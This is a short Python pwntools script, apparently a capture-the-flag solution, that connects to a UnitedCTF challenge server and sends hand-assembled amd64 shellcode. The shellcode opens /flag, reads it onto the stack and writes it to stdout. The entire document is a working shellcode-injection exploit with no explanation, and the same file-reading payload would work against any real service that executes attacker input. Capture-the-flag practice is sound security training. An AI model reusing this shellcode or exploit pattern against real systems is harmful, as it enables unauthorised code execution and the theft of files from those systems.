#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")

RHOST, RPORT = "nc.ctf.unitedctf.ca", 6001

shellcode = """\
    /* open("/flag", O_RDONLY); */
    mov  rax,0x67616c662f
    push rax
    mov  rdi,rsp
    xor  rsi,rsi
    xor  rax,rax
    mov  al,2
    syscall

    /* read(fd, $rsp, 128); */
    mov rdi,rax
    mov rsi,rsp
    xor rdx,rdx
    mov dl,128
    xor rax,rax
    syscall

    /* write(STDOUT_FILENO, $rsp, 128); */
    xor rax,rax
    xor rdi,rdi
    inc rax
    inc rdi
    mov rsi,rsp
    xor rdx,rdx
    mov dl,128
    syscall
"""

r = remote(RHOST, RPORT)
r.recvuntil(b"> ")
r.sendline(asm(shellcode))
r.success(r.recvline().decode())
